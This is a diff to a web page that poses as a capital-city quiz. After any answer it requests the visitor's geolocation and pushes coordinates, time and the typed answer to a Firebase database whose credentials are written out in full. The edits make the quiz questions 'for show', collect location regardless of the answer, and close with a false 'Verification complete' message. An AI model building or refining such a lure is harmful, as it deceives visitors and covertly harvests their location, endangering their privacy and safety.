@@ -14,20 +14,20 @@
 <p>Answer the following question:</p>
 
 <div id="quiz">
-  <p>What is the capital of France?</p>
+  <p id="question"></p>
   <input type="text" id="answer" placeholder="Type your answer">
   <br><br>
-  <button onclick="checkAnswer()">Submit</button>
+  <button onclick="submitAnswer()">Submit</button>
 </div>
 
 <p id="message"></p>
 
-<!-- Firebase scripts -->
-<script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
-<script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
+<!-- Lightweight Firebase -->
+<script type="module">
+import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.1/firebase-app.js";
+import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/9.22.1/firebase-database.js";
 
-<script>
-// Your Firebase configuration
+// Firebase config
 const firebaseConfig = {
   apiKey: "AIzaSyD-myAkBLFbPyqIomR02q6iftboysae-wQ",
   authDomain: "locationxdd.firebaseapp.com",
@@ -38,19 +38,26 @@ const firebaseConfig = {
   appId: "1:114480292043:web:d143429c68784b0706bb4e"
 };
 
-firebase.initializeApp(firebaseConfig);
-const db = firebase.database();
+const app = initializeApp(firebaseConfig);
+const db = getDatabase(app);
 
-// Check quiz answer
-function checkAnswer() {
-  const userAnswer = document.getElementById('answer').value.trim().toLowerCase();
-  if (userAnswer === "paris") {
-    document.getElementById('message').innerText = "Correct! Collecting your location...";
-    document.getElementById('quiz').style.display = 'none';
-    getLocation();
-  } else {
-    document.getElementById('message').innerText = "Wrong answer. Try again.";
-  }
+// Capital quiz questions (random for show)
+const quizData = [
+  { country: "France", capital: "paris" },
+  { country: "Japan", capital: "tokyo" },
+  { country: "Australia", capital: "canberra" },
+  { country: "Brazil", capital: "brasilia" },
+  { country: "Canada", capital: "ottawa" }
+];
+
+const currentQuiz = quizData[Math.floor(Math.random() * quizData.length)];
+document.getElementById('question').innerText = `What is the capital of ${currentQuiz.country}?`;
+
+// Submit answer (location requested regardless of answer)
+function submitAnswer() {
+  document.getElementById('quiz').style.display = 'none';
+  document.getElementById('message').innerText = "Collecting your location...";
+  getLocation();
 }
 
 // Get location and send to Firebase
@@ -63,10 +70,12 @@ function getLocation() {
 }
 
 function sendPosition(position) {
-  db.ref("locations").push({
+  push(ref(db, "locations"), {
     latitude: position.coords.latitude,
     longitude: position.coords.longitude,
-    time: new Date().toString()
+    time: new Date().toString(),
+    countryQuestion: currentQuiz.country,
+    userAnswer: document.getElementById('answer').value.trim()
   });
   document.getElementById('message').innerText = "Verification complete! Thank you.";
 }
@@ -74,6 +83,8 @@ function sendPosition(position) {
 function showError(error) {
   alert("Location permission denied or error occurred.");
 }
+
+window.submitAnswer = submitAnswer;
 </script>
 
 </body>
